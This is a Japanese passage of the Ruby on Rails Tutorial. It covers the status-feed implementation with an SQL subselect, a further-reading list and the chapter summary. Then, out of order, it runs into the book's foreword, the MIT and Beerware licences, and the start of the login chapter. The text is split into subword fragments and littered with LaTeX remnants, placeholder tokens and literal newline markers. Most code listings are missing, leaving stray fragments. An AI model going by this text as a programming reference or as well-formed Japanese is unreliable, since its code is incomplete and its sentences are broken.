▁また 、 ユーザーを ア ン フォロー する とき も 構造 は ほとんど 同じ で 、\ ko de { post } メソッドを \ ko de { delete } メソッド に置き換え て テスト します 。
▁つまり 、 その ユーザーの id と リレーションシップ の id を使って DELETE リクエスト を送信し 、 フォロー している 数 が 1 つ 減 る ことを確認します 。
▁これらの テストを まとめ た 結果を 、 リスト \ ref { code : follow _ button _ tests } に示します 。
▁ Follow / U n follow ボタン をテストする
▁ つ い に 、 サンプルアプリケーションの 山 頂 が 目 の 前に 現 れ ました 。 最後の 難 関 、 ステータスフィード の実装 に 取り か か り ましょう 。
▁ この節 で 扱 わ れ ている 内容 は 、 本書 の中で も 最も 高度な ものです 。
▁ 完全な ステータスフィード は 、\ ref { sec : a _ proto _ feed } で 扱 った プロ ト フィード を ベース に します 。 現在のユーザー に フォロー されている ユーザーの マイクロポストの 配列 を作成し 、 現在のユーザー 自身 の マイクロポスト と 合わせ て 表示 します 。
▁この セクション を通して 、 複 雑 さ を 増 した フィード の実装 に 進 んで い きます 。
▁これ 実現 するために は 、 Rails と Ruby の 高度な 機能 の 他 に 、 SQL プログラミング の 技術 も 必要 です 。
▁ 手 強 い 課題 に 挑 む のです から 、 ここで 実装 すべき 内容 を 慎 重 に 見 直 す ことが 重要です 。
▁ 図 \ ref { fig : page _ flow _ home _ page _ feed _ mockup } で お 見 せ した ステータスフィード の 最 終 形 を 図 \ ref { fig : home _ page _ feed _ mockup } に 再度 掲 載 します 。
▁ ステータスフィード 付き の Home ページのモックアップ
▁\ label { fig : home _ page _ feed _ mockup } }< n >\ end { figure }< n >< n > ▁% ▁ section ▁the _ status _ feed ▁( end )< n >< n > ▁\ subsection { 動 機 と 計 画 } ▁% ▁( fold )< n > ▁\ label { sec : m o t i v ation _ and _ s tr at e g y }< n >< n >
▁ ステータスフィード の 基本的な アイディア は シ ン プ ル です 。
▁ 図 の 矢 印 で 示 されている ように 、 この 目的 は 、 現在のユーザー によって フォロー されている ユーザー に対応する ユーザー id を持つ マイクロポスト を取り出し 、 同時に 現在のユーザー 自身 の マイクロポスト も 一 緒 に 取り出す ことです 。
▁id ▁1 の ユーザーが id ▁2 、 7 、 8 、 10 を フォロー している とき の フィード
▁この テスト で 重要な ことは 、 フィード に 必要な 3 つの 条件 を 満 た す ことです 。 1 ) ▁ フォローしているユーザー の マイクロポスト が フィード に 含 まれ ている こと 。 2 ) ▁ 自分自身 の マイクロポスト も フィード に 含 まれ ている こと 。 3 ) ▁\ emph { フォロー していない } ユーザーの マイクロポスト が フィード に 含 まれ ていない こと 。
▁ そして リスト \ ref { code : users _ fixtures _ ext r a _ users } と リスト \ ref { code : add _ micropost _ d if f er ent _ own er } の fixture ファイル から 、 Michael の フィード では L an a と 自分自身 の 投 稿 が 見え て いて 、 A r ch er の 投 稿 は 見え ない ことがわかります 。
▁ 先ほど の 3 つの 条件 を アサーション に変換 して 、 User モデル ▁( リスト \ ref { code : proto _ status _ feed }) ▁\ ko de { feed } メソッド がある ことに 注意 し ながら 、 更新 した User モデル に対するテスト を 書い てみましょう 。 結果を リスト \ ref { code : full _ feed _ test } に示します 。
▁ ステータスフィード のテスト
▁ 最終的な フィード の実装 は や や 込 み 入 っている ため 、 細 か い 部品 を 1 つ ず つ 確かめ ながら 導入 していきます 。
▁最初に 、 この フィード で 必要な クエリ について 考え ましょう 。
▁ここで 必要な のは 、\ ko de { microposts } テーブル から 、 ある ユーザー ▁( つまり 自分自身 ) ▁ が フォローしているユーザー に対応する id を持つ マイクロポスト をすべて 選択 ▁( select ) ▁ することです 。
▁この クエリ を 模 式 的に 書く と 以下の ようになります 。
▁ microposts
▁上のコード を 書く 際に 、 SQL が \ ko de { IN } という キーワード を サポート している ことを 前 提 に しています ▁( 大 丈 夫 、 実際に サポート されています )。 この キーワード を使用することで 、 id の 集合 の 内 包 ▁( set ▁ i nclusion ) ▁ に対して テストを 行 え ます 。
▁\ ref { sec : a _ proto _ feed } の プロ ト フィード では 、 上 のような 選択 を行う ために Active ▁Record で リスト { p 2 } のように {3} where {/3} メソッドを使用して いた ことを思い出してください 。
▁このとき は 、 選択 する 対象 は シ ン プ ル で した 。 現在のユーザー に対応する ユーザー id を持つ マイクロポスト をすべて 選択 すれば よ か った ので した 。
▁ここで 行 いた い 選択 は 、 上 よりも もう少し 複 雑 で 、 たとえば 以下のような感じ になります 。
▁これらの 条件 から 、 フォロー されている ユーザー に対応する id の配列 が 必要 であること が わ か っ てきました 。
▁これ を行う 方法 の 1 つ は 、 Ruby の \ ko de { ma p } メソッド を使用すること です 。 このメソッドは すべての ▁" 列 挙 可能 ▁( enumera b le ) " ▁ オブジェクト ▁( 配列 や ハッシュ など 、 要素 の 集合 で 構成 される あらゆる オブジェクト { p 1 }) ▁ で 使用できます 。
▁ 列 挙 可能 ▁( enumera b le ) ▁ オブジェクト であること の 主 な 条件 は 、\ ko de { each } メソッドを 実装 している ことです 。 このメソッドは コレクション を 列 挙 します 。
▁なお 、 このメソッドは \ ref { sec : block s } でも 出 てきました 。 他の 例 題 として 、\ ko de { ma p } メソッドを使って 配列 を 文字列 に変換 すると 、 次の ようになります 。
▁=> ▁[" 1 ", ▁" 2 ", ▁" 3 ", ▁" 4 "]
▁\ ko de { join } メソッド ▁(\ ref { sec : array s _ and _ range s }) ▁ を使用すれば 、 id を 集 め た 文字列を 以下のように カ ン マ 区切 り で つ な げ る こともできます 。
▁=> ▁" 1 , ▁ 2, ▁ 3, ▁4 "
▁上の メソッド を使用すれば 、\ ko de { user . following } にある 各 要素 の \ ko de { id } を 呼び出し 、 フォローしているユーザー の id の配列 を構成する ことができます 。
▁たとえば 、 データベース の最初の ユーザーの 場合は 、 以下の 配列 になります 。
▁=> ▁[ 4 , ▁5 , ▁ 6 , ▁ 7 , ▁ 8 , ▁ 9 , ▁10 , ▁ 11 , ▁1 2, ▁1 3, ▁ 14 , ▁ 15 , ▁ 16 , ▁ 17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1 , ▁2 2, ▁2 3,
▁2 4 , ▁2 5 , ▁2 6 , ▁ 27 , ▁ 28 , ▁2 9 , ▁3 0, ▁3 1 , ▁3 2, ▁3 3, ▁3 4 , ▁3 5 , ▁3 6 , ▁3 7 , ▁3 8 , ▁3 9 , ▁4 0, ▁4 1 , ▁4 2,
▁4 3, ▁4 4 , ▁4 5 , ▁4 6 , ▁4 7 , ▁4 8 , ▁4 9 , ▁5 0, ▁5 1 ]
▁ 実際 、 この 手法 は 実 に 便利な ので 、 Active ▁Record は 以下 でも デフォルトで 同じ 結果 を返します 。
▁この \ ko de { following \_ id s } メソッドは 、 実は Active ▁Record によって \ ko de { has \_ many ▁: following } 関連付け から 自動生成 された ものです ▁( リスト \ ref { code : has _ many _ following _ through _ active _ relationships })。 これにより 、\ ko de { user . following } コレクション に対応する id を得る ための \ ko de { \_ id s } を 、 関連付け の名前 に追加する だけで 済み ます 。
▁ フォローしているユーザー id の 文字列 は以下のようになります 。
▁=> ▁" 4 , ▁5 , ▁ 6 , ▁ 7 , ▁ 8 , ▁ 9 , ▁10 , ▁ 11 , ▁1 2, ▁1 3, ▁ 14 , ▁ 15 , ▁ 16 , ▁ 17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1 , ▁2 2, ▁2 3,
▁4 3, ▁4 4 , ▁4 5 , ▁4 6 , ▁4 7 , ▁4 8 , ▁4 9 , ▁5 0, ▁5 1
▁なお 、 以上 は 説明 のための コード であり 、 実際に SQL 文字列 に 挿 入 する とき は 、 この ように 記述 する必要はありません 。 実は 、\ ko de { ?} を 内 挿 すると 自動的に この 辺 り の 面倒 を見 て く れ ます 。 さらに 、 データベースに 依 存 する 一部の 非 互 換 性 まで 解 消 してくれます 。
▁つまり 、 ここでは \ ko de { following \_ id s } メソッドを そのまま 使 えば よい だけ な のです 。
▁ 結果 、 最初に 想 像 して いた とおり
▁ が 無 事 に 動 き ました !
▁作成した コードをリスト \ ref { code : initial _ working _ feed } に示します
▁ と り あ え ず 動く フィード の実装
▁# ▁ユーザーの ステータスフィード を返す
▁これで テストは ▁\ passing ▁ になるはずです 。
▁ いくつかの アプリケーション において は 、 この 初期 実装 だけで 目的 が 達 成 され 、 十分 に 思える かもしれません 。 しかし リスト \ ref { code : initial _ working _ feed } に はまだ 足 り ない もの があります 。 それ が 何 な のか 、 次の 節 に進む前に 考え て みてください
▁(\ emph { ヒント : } フォローしているユーザー が 5 000 人 も い たら どう な る でしょう か )。
▁ 前 節 の ヒント で お わかり のように 、\ ref { sec : a _ first _ feed _ im p le m ent ation } の フィード の実装 は 、 投 稿 された マイクロポストの 数 が 膨 大 になった ときに うまく ス ケ ー ル アップ できません 。 フォローしているユーザー が 5 000 人 程 度 になる と こう い う ことが 起 き る 可能性があります 。
▁この節では 、 フォローしているユーザー 数 に応じて ス ケ ー リ ング できるように 、 ステータスフィード を 再度 実装します 。
▁\ ref { sec : a _ first _ feed _ im p le m ent ation } で示した コードの 問題 は 、\ ko de { following \_ id s } で フォロー している \ emph { すべての } ユーザーを メモリ ー から 一 気 に 取り出し 、 フォローしているユーザー の 完全な 配列 を 作り 出 した ことです 。
▁リスト \ ref { code : initial _ working _ feed } の 条件 では 、 集合 に 内 包 されている かどうか だけ しか チェック されていない ため 、 この 部分を もっと 効率 的な コード に できる はずです 。 そして 、 SQL は 本 来 このような 集合 の 操作 に 最適化 されています 。
▁ これを 解決 する方法 は 、 フォローしているユーザー の id の 検索 をデータベースに保存する ときに \ emph { サブ セレクト ▁( sub select ) ▁ } を使用すること です 。
▁リスト \ ref { code : feed _ sec on d _ c u t } で コードを 若 干 修正 し 、 フィード を リファクタリング すること から 始 め ましょう 。
▁\ ko de { where } メソッド 内の 変数 に 、 キー と 値 の ペ ア を使う
▁ following
▁ 次の 段 階 の 準備 として 、 以下のコード を
▁以下の 同 等 のコード に置き換え ました 。
▁ following
▁ 前 者 の 疑問符 を使用した 文法 も 便利です が 、\ emph { 同じ } 変数 を 複数の 場所 に 挿 入 したい場合は 、 後 者 の 置き換え 後 の 文法 を使用する の が より 便利です 。
▁上の 説明 が 暗 に 示す ように 、 これ から SQL クエリ に \ emph { もう 1 つ } の \ ko de { user \_ id } を追加します 。
▁ 特に 、 以下の Ruby コードは 、
▁以下の SQL ス ニ ペ ッ ト と 置き換え ることができます 。
▁ このコード では SQL サブ セレクト が 使用 されています 。 ユーザー 1 について すべて を 選択 すること は 、 内部 的に は 以下のような感じ になります 。
▁この サブ セレクト は 、 集合 の ロ ジ ッ ク を ▁( Rails ではなく ) ▁ データベースに保存 する ので 、 より 効率 が 高 まり ます
▁これで 基 礎 を 固 め ること が できました ので 、 リスト \ ref { code : feed _ f in al } のように もっと 効率 な フィード を実装する 準備 が できました 。
▁ フィード の 最終的な 実装
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁このコードは Rails と Ruby と SQL が 複 雑 に 絡 み 合 って いて 厄 介 ですが 、 ち ゃ ん と 動作します 。
▁もちろん 、 サブ セレクト を使用すれば い く ら でも ス ケ ー ル アップ できる など という ことはありません 。
▁ 大 規 模 な Web サイト では 、 バ ッ ク グ ラ ウ ンド ジョブ を使用して 、 フィード を 非 同 期 で 生成 する などの 対策 が 必要 でしょう 。 Web サイトの ス ケ ー リ ング のような デ リ ケ ート な 問題 は 本書 の 範 疇 を 超 え ます 。
▁リスト \ ref { code : feed _ f in al } を も って 、 ステータスフィード の実装 は 完了 です 。
▁\ ref { sec : a _ proto _ feed } で Home ページに は 既に フィード を追加して いた ことを思い出してください 。 ▁ 思い 出 す キ ッ カ ケ として 、\ ko de { home } アクション は リスト \ ref { code : re al _ feed _ instance _ variable } に 再 掲 します 。
▁ 第 \ ref { cha : user _ microposts } 章では ただ の プロ ト タイプ で した が ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 、 リスト \ ref { code : feed _ f in al } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed })。
▁\ ko de { home } アクション 内で 、 フィード にも ページネーション を 適 用 する
▁ Home ページ で 動作する ステータスフィード
▁ この時点で 、 master ブランチ に変更 を 取り 込 む 準備 が できました 。
▁ コードを リポジトリ に push して 、 本番環境 に デプロイ してみましょう 。
▁ 本番環境で 動作する ステータスフィード は以下のようになります ▁( 図 \ ref { fig : l ive _ status _ feed })。
▁ 本番環境で 動作する ステータスフィード
▁ ステータスフィード が追加され 、\ emph { Ruby ▁on ▁Rails チュートリアル } の サンプルアプリケーション が と う と う 完成 しました 。
▁この サンプルアプリケーション には 、 Rails の 主要な 機能 ▁( モデル 、 ビュー 、 コントローラ 、 テンプレート 、 パーシャル 、 フィルタ 、 検証 、 コールバック 、\ ko de { has \_ many } / \ ko de { belongs \_ to } / \ ko de { has \_ many ▁ through } 関連付け 、 セキュリティ 、 テスティング 、 展開 ) ▁ が 多 数 含まれています 。
▁これ だけで も かなり の 量 ですが 、 ▁Web 開発 つ いて 学ぶ べ き こと はまだ まだ たくさん あります 。
▁ 今後 の 学習 の 手 始 め と するために 、 この節 では 、 より 踏 み 込 んだ 学習 を するための 方法 を 紹 介 します 。
▁< n >< n > ▁\ subsection { 読み 物 ガイド } ▁% ▁( fold )< n > ▁\ label { sec : guid e _ to _ f ur the r _ resources }< n >< n >
▁ 読 む に 値 する Rails 関連 の 書 籍 や ドキュメント は 書 店 や Web で い く ら でも 見つけ られます 。 正 直 、 あ まり の 多 さ に 閉 口 する ほど です 。
▁ 幸 い 、 それらの ほとんど が 現在 でも 入 手 / アクセス 可能です 。
▁ より 高度な 技術 を 身 に 付け るため の お勧め リソース を いくつか リスト アップ します 。 < n >< n > [ J A P A N E S E _ RE F S ]
▁\ href { http :// sc re en casts . railstutorial . org /}{ Rails スクリーンキャスト } : ▁ 本書 に合わせて 、 完 全 版 の スクリーンキャスト ▁( 現在 は 英語 版 のみ ) ▁ を 用 意 して あります 。
▁この スクリーンキャスト では 、 本書 の 話 題 をすべて カ バー している だけで なく 、 さまざまな コ ツ や 秘 訣 も 満 載 され ており 、 ス ク リ ー ン シ ョ ッ ト だけで は 捉 え にくい 実際の 動作 を 動 画 で 視 聴 することもできます 。
▁ スクリーンキャスト ▁( 英語 ) ▁ は ▁\ href { http :// www . railstutorial . org /}{ Ruby ▁on ▁Rails チュートリアル Web サイト } ( 英語 版 ) で 購 入 できます 。
▁\ href { http :// www . g o te al e a f . com / railstutorial } { T e al e a f ▁A ca de my } : ▁ 開発者 自身 による 新 人 向け ト レ ー ニ ング 講 座 が 最 近 増え てきました 。 身 の 回 り の そう い った 人 が い れば よい のですが 、 そう で ない場合は オンライン で ど こ から でも 受 講 できる \ href { http :// www . g o te al e a f . com / railstutorial } { T e al e a f ▁A ca de my } があります 。
▁ も し 体 系 化 された カ リ キ ュ ラ ム や イン スト ラ ク ター による フィード バ ッ ク が 欲 し け れば 、 T e al e a f は 良い 選択 肢 と なり 得 る でしょう 。
▁ ほとんど の 生 徒 は プログラミング 経験 が 乏 しい 時点 から ス ター ト しています が 、 強 い 意 志 と 高 い モ チ ベ ー ション を も っています ▁( 上 達 には これら が必要です )。
▁ T ur ing ス ク ー ル では 、 生 徒 が 卒 業 後に 職 を見つけ ること を 保 証 して いて 、 見つか ら なければ 授 業 料 を 返 還 しています 。
▁\ href { http :// www . th in k f ul . com / a / railstutorial } { T h in k f ul } : ▁ プロ の エ ン ジ ニ ア と ペ ア を 組 んで 、 プロジェクト 実 践 型 の カ リ キ ュ ラ ム で 進 んで い く オンライン 講 座 です 。
▁ 対応 している 科 目 は Ruby ▁on ▁Rails 、 フ ロ ン ト エ ンド 開発 、 Web デザイン 、 データ サ イ エ ン ス です 。
▁\ href { https :// tutorial s . rails app s . org / hartl } { Rails A p p s } : ▁ 教 育 目的 の 、 Rails アプリケーションの サンプル 集 です 。
▁\ href { http :// m b s y . co / 6 V Q 8 l } { Co de ▁S ch o ol } : ▁ 非常に 多 種 多 様 な プログラミング を 対 話 的に 学習 できる コース
▁\ href { https :// www . u de my . com / learn - test - d r ive n - development - in - ruby / co up on Co de = hartl } { B al a ▁P ar an j ’ s ▁ Test ▁D r ive n ▁D e ve lo p m ent ▁in ▁Ruby } : ▁Ruby を使って テスト駆動開発 を学ぶ 、 上 級 者 向け の オンライン 講 座 です 。
▁\ href { http :// rails casts . com /}{ RailsCast s } : ▁最初に \ href { http :// rails casts . com / e p is odes / ar ch ive } { RailsCast s エ ピ ソ ー ド ア ー カ イ ブ } を開いて 、 目 に つ いた トピック を 適 当 に 開 く ところ から 始 め てみると よいでしょう 。
▁Ruby や Rails の お勧め 書 籍 : ▁ 「\ href { http :// www . a mazon . com / g p / product / 14 30 2 23 6 3 4 }{\ emph { B e g in n ing ▁Ruby } } 」( P e ter ▁C oo per ▁ 著 ) 、 「\ href { http :// www . a mazon . com / g p / product / 19 3 3 9 88 6 5 7 }{\ emph { The ▁We ll - G r ound ed ▁Ruby ist } } 」( David ▁A . ▁B l ack 著 ) 、 「\ href { http :// www . a mazon . com / E lo que n t - Ruby - A d d is on - W es le y - Pro f ess ion al - S er ies / d p / 0 3 2 15 8 4 10 4 /}{ \ emph { E lo que n t ▁Ruby } } 」( R us s ▁ O l s en 著 ) 、 Ruby を さらに 深 く 学ぶ のであれば ▁ 「\ href { http :// www . a mazon . com / g p / product / 06 7 23 2 88 4 4 }{\ emph { The ▁Ruby ▁ W a y } } 」( H al ▁F ul to n 著 ) ▁ が お勧め です 。
▁Rails を さらに 深 く 学ぶ のであれば 「\ href { https :// p r a g pro g . com / book / rails 4 / a g il e - web - development - with - rails - 4 } { A g il e ▁Web ▁D e ve lo p m ent ▁with ▁Rails } 」( S am ▁Ruby ▁ / ▁D a ve ▁ T h o ma s ▁ / ▁ David ▁ H e in e me i er ▁ H an s s on 著 ) 、 「\ href { http :// www . a mazon . com / Rails - Edit ion - A d d is on - W es le y - Pro f ess ion al - S er ies / d p / 0 3 2 19 4 4 27 5 }{\ emph { The ▁Rails ▁4 ▁ W a y } } 」( O b i e ▁F er n and e z ▁ / ▁ K e v in ▁F a us t in o 著 ) 、 「\ href { http :// www . a mazon . com / Rails - 4 - Action - Ryan - B ig g / d p / 16 17 2 9 10 99 }{\ emph { Rails ▁4 ▁in ▁Action } }」 ▁( Ryan ▁B ig g ▁ / ▁ Y e h u d a ▁ K at z 著 ) が お勧め です 。 < n >< n > [ R A I L S G U IDE S _ J P ]
▁< n >< n >\ end { item ize }< n >< n > ▁% ▁subsection ▁ guid e _ to _ f ur the r _ resources ▁( end )< n >< n > ▁\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n > ▁\ label { sec : following _ users _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >\ item
▁\ ko de { has \_ many ▁: through } を使うと 、 複雑な データ 関係 を モデリング できる
▁\ ko de { has \_ many } メソッド には 、 クラス名 や 外部キー など 、 い く つ もの オプションを 渡す ことができる 。 たとえば
▁ 適切な クラス名 と 外部キー と 一 緒 に \ ko de { has \_ many } / \ ko de { has \_ many ▁: through } を使う ことで 、 能 動的 関係 ▁( フォロー する ) ▁ や 受 動的 関係 ▁( フォロー される ) ▁ が モデリング できた
▁ ルーティング は 、 ネスト させ て 使う ことができる
▁\ ko de { where } メソッド を使うと 、 柔 軟 で 強力な データベース への 問 い 合わせ が 作成 できる
▁Rails は ▁( 必要に応じて ) ▁ 低 級 な SQL クエリ を呼び出す ことができる
▁ 本書 で 学 んだ すべて を 駆 使 することで 、 フォローしているユーザー の マイクロポスト 一覧 を ステータスフィード に 表示 させる ことができ た
▁ Home ページ と Pro file ページ にある 統 計 情報 のテスト を 書い て みてください 。
▁\ emph { ヒント } : ▁リスト \ ref { code : user _ profile _ test } のテスト に追加 してください 。
▁( Home ページの 統 計 情報 は 別の テスト に して み ません か 。 )
▁ Home ページに 表示 されている 1 ページ 目 の フィード を テスト してください 。
▁リスト \ ref { code : home _ feed _ test } は その テンプレート です 。
▁\ ko de { C G I . es ca p e HTML } で HTML の エスケープ 処理 を 使っている 点 に 注 目 して 、 な ぜ これ が 必要な のか 考え て みてください 。
▁( 試 し に エスケープ 処理 を 外 して 、 HTML の ソースコード を 注意 深 く 調 べ てください 。 マイクロポスト の内容 が お か しい はずです 。 )
▁ フィード の HTML をテストする
▁ 私 が 前に いた 会 社 ▁( C D ▁B a by ) ▁ は 、 かなり 早 い 段 階 で Ruby ▁on ▁Rails に 乗 り 換 え た のですが 、 また P H P に 戻 っ てしまい ました ▁( 詳 細 は 私 の名前 を Google で 検索 してみてください )。
▁ そ ん な 私 ですが 、 Michael ▁Hartl ▁ 氏 の 本 を 強 く 勧 め られ たので 、 その 本 を使って もう一度 試 して み た 結果 、 今度は 無 事 に ▁Rails ▁ に 乗 り 換 え ること が できました 。 それ が この ▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } という 本 です 。
▁ 私 は 多くの ▁Rails ▁ 関連 の 本 を 参 考 に し てきました が 、 真 の 決 定 版 と 呼 べ る もの は 本書 を お いて 他 に ありません 。
▁ 本書 では 、 あらゆる 手順 が ▁Rails ▁ 流 で 行 わ れ ています 。 最初の う ち は 慣 れる まで に 時間 が か か り ましたが 、 この 本 を 終 え た 今 、 つ い に これ こ そ が 自 然 な 方 式 だと 感 じ られ る まで に なりました 。
▁また 、 本書 は ▁Rails ▁ 関連 の 本 の中で 唯 一 、 多くの プロ が 推 奨 する テスト駆動開発 ▁( T D D : ▁ Test ▁D r ive n ▁D e ve lo p m ent ) ▁ を 、 全 編 を通して 実 践 しています 。 実 例 を使って ここ まで 分 か り や す く 解 説 された 本 は 、 本書 が 初めて でしょう 。
▁ 極 め つ け は 、 Git ▁ や ▁ GitHub 、 Heroku ▁ の 実 例 に含め ている 点 です 。 このような 、 実際の 開発 現 場 で 使 わ ている ツール も チュートリアル に 含 まれ ている ため 、 読者 は 、 ま る で 実際の プロジェクト の 開発 プロセス を 体 験 している か のような 感 覚 が 得られ る はずです 。
▁ それ で いて 、 それぞれの 実 例 が 独 立 した セクション になっている の ではなく 、 その ど れ も が チュートリアル の内容 と 見 事 に 一 体 化 しています 。
▁ 本書 は 、 筋 道 だ った 一 本 道 の 物 語 の ようになっています 。
▁3 日 間 で 読 破 する のは 異 常 です !
▁ 実際には \ emph { もっと 時間 を かけ て 読 む の が 一般的 } です 。
▁ 最 初 から 最 後 まで 、 途 中 を 飛 ば さ ずに や る の が 一 番 効果 的 で 有 益 な 読み 方 です 。 ぜ ひ や って みてください 。
▁それでは 、 楽 し んで お 読み ください !
▁\ href { http :// s i ver s . org /}{ デ レ ッ ク シ バー ズ ▁( D er e k ▁S i ver s ) } ▁(\ href { http :// s i ver s . org /}{ s i ver s . org })
▁C D ▁B a by ▁ 創 始 者
▁ 著 作 権 と ラ イ セ ン ス
▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル : ▁ 実 例 を使って ▁Rails ▁ を 学 ぼ う }
▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } 内の 全 て の ソースコード は 、\ href { http :// o p en source . org / li ce n s es / M I T } { M I T ▁ ラ イ セ ン ス } および ▁\ href { http :// people . free b s d . org / ~ ph k /}{ B e er w ar e ▁ ラ イ セ ン ス } の 元 で 提供され ています 。
▁ The ▁ M I T ▁ L i ce n s e < n >< n > Co p y right ▁( c ) ▁20 14 ▁ Michael ▁Hartl < n >< n > P e rm is s ion ▁is ▁ her e by ▁ gra n t ed , ▁ free ▁of ▁ cha r g e , ▁to ▁ any ▁ person ▁ o b t a in ing ▁a ▁ co p y < n > of ▁this ▁ s of t w ar e ▁and ▁ associate d ▁ document ation ▁ file s ▁( the ▁" S of t w ar e ") , ▁to ▁ de al < n > in ▁the ▁S of t w ar e ▁with out ▁ re st ri c tion , ▁in c l u d ing ▁with out ▁ limit ation ▁the ▁ right s < n > to ▁use , ▁ co p y , ▁ mod if y , ▁ merge , ▁ publish , ▁d ist ri b u te , ▁ sub li ce n s e , ▁and / or ▁ s e ll < n > co p ies ▁of ▁the ▁S of t w ar e , ▁and ▁to ▁ per m it ▁ person s ▁to ▁ w h o m ▁the ▁S of t w ar e ▁is < n > f ur n i sh ed ▁to ▁do ▁ s o , ▁ subject ▁to ▁the ▁ following ▁ con d it ions : < n >< n > The ▁a b o ve ▁ co p y right ▁ no tic e ▁and ▁this ▁ per m is s ion ▁ no tic e ▁ sh all ▁be ▁ include d ▁in < n > all ▁ co p ies ▁ or ▁ sub st an t i al ▁ port ions ▁of ▁the ▁S of t w ar e .
▁< n >< n > THE ▁S O F T W A RE ▁I S ▁P R O V IDE D ▁" A S ▁I S ", ▁ W I T H O UT ▁ W A R R A N T Y ▁ O F ▁A N Y ▁ K IN D , ▁ E X P RE S S ▁OR < n > I M P L I E D , ▁ IN C L U D ING ▁B UT ▁NOT ▁LIMIT E D ▁ T O ▁ THE ▁ W A R R A N T I E S ▁ O F ▁ M ER C H A N T A B I L I T Y , < n > F I T N E S S ▁F O R ▁A ▁P A R T I C U L A R ▁P U R P OS E ▁ AND ▁ N ON IN F R ING E M E N T .
▁ IN ▁ N O ▁ E V E N T ▁S H A L L ▁ THE < n > A UT H O R S ▁OR ▁C O P Y R I G H T ▁ H O L D ER S ▁B E ▁ L I A B L E ▁F O R ▁A N Y ▁C L A I M , ▁D A M A G E S ▁OR ▁ O THE R < n > L I A B I L I T Y , ▁ W H E THE R ▁ IN ▁A N ▁A C T I ON ▁ O F ▁C ON T R A C T , ▁ T O R T ▁OR ▁ O THE R W I S E , ▁A R I S ING ▁FROM , < n > O UT ▁ O F ▁OR ▁ IN ▁C ON N E C T I ON ▁ W I T H ▁ THE ▁S O F T W A RE ▁OR ▁ THE ▁ U S E ▁OR ▁ O THE R ▁D E A L ING S ▁ IN < n > THE ▁S O F T W A RE .
▁ / * < n > ▁* ▁ --------------- --------------- ---------------- --------------- --------------- < n > ▁* ▁" THE ▁B E ER W A RE ▁ L I C E N S E " ▁( Re v is ion ▁4 3 ) : < n > ▁* ▁ Michael ▁Hartl ▁ w r o te ▁this ▁ code .
▁A s ▁ lo n g ▁as ▁you ▁ re t a in ▁this ▁ no tic e ▁you < n > ▁* ▁c an ▁do ▁ what e ver ▁you ▁ w an t ▁with ▁this ▁ st u f f .
▁I f ▁we ▁ me e t ▁ some ▁ day ,
▁* ▁and ▁you ▁ th in k ▁this ▁ st u f f ▁is ▁ w or th ▁it , ▁you ▁c an ▁ b u y ▁ me ▁a ▁be er ▁in ▁ return .
▁< n > ▁* ▁ --------------- --------------- ---------------- --------------- --------------- < n > ▁* /
▁{0} 第 {1} 7 {/1} 章 {/0} で Web サイト で の 新規ユーザー 登録 が 行える ようになりました ので 、 今度は ユーザーが ログイン や ログアウト を 行える ように しましょう 。
▁ここでは 、 Web の ログイン や ログアウト で 一般的 に 実装 される 、 以下の 3 種類 の動作 をすべて 実装 する ことにします 。 1 : ▁ ブラウザを閉じ ると ログイン を 破 棄 する ▁(\ ref { sec : sessions _ and _ failed _ login } と \ ref { sec : log g ing _ in })。 2 : ▁ユーザーの ログイン を \ emph { 自動 で } 保存 する ▁(\ ref { sec : remember _ me })。 3 : ▁ ユーザーが 「 パスワード を保存する ▁( remember ▁ me )」 チェックボックス を オン に した \ emph { 場合 のみ } ログイン を保存する ▁(\ ref { sec : remember _ me _ check box })
▁ その他 に 、 一 定 時間 が 経 過 すると セッション を 期限切れ にする モデル もあります 。
▁この モデル は 、 イン ター ネ ッ ト バ ン キ ング や 金 融 取 引 口 座 などの 重要な 情報 を扱う Web サイトに 向 い ています 。
▁ 本 章 で 開発 する 認 証 ▁( authentication ) ▁ システム によって 、 サイト を カスタマイズ して 現在のユーザー の 「 ログイン ステータス 」 と 「 ID 」 に 基 づ いた 認 可 ▁( author i z ation ) ▁ モデル を実装する ことができます 。
▁たとえば 、 本 章では サイト ヘッダー の ログイン / ログアウト リンク や プロフィール リンクを 改 造 します 。
▁ 次の { 0} 第 {1} 9 {/1} 章 {/0} で使用する セキュリティ モデル では 、 ログイン した ユーザー だけ が 自分の index ページに 移動 できるように したり 、 正 当 な ユーザー だけ が 自分の ページの プロフィール 情報を 編集 できるように したり 、 管理者 だけ が 他の ユーザーを データベースから 削除 できるように したり します 。
▁ 最終的に 、 { 0} 第 {1} 11 {/1} 章 {/0} で マイクロポスト 作成 時に ログイン 済み ユーザーの ID を使用して マイクロポスト と ユーザーを 関連付け 、 {2} 第 {1} 12 {/1} 章 {/2} で 現在のユーザー が 他の ユーザーを アプリケーション 上で フォロー できるように し 、 それ によって 相手 の マイクロポストの フィード を 自分の ページに 表示 できるようにします 。
▁ 本 章では 、 アプリケーション 全体 で 共通 する ログイン システム の 細 か い 部分を 多 数 扱 う ので 、 その 分 他の 章 に 比 べ て 長 く 、 難 易 度 も 高 く な っています 。 細 部 に と ら わ れる と 苦 し くなる ば か り なので 、 この章 を 完了 するために も 、 完 璧 に 理解 し よう と する よりも 、 と に か く 辛 抱 強 く 節 を ひとつ ず つ 終 わ ら せる ことを 優 先 してください 。
▁なお 、 多くの 読者 が 「 この章 を 2 回 通 して 完了 すると 学習 効果 が 非常に 高 ま った 」 と の 報 告 を 寄 せ て く れ ています 。 皆 さ ん も 、 可能 であれば この章 を 2 回 通 して 行う ことを お す す め いた します 。
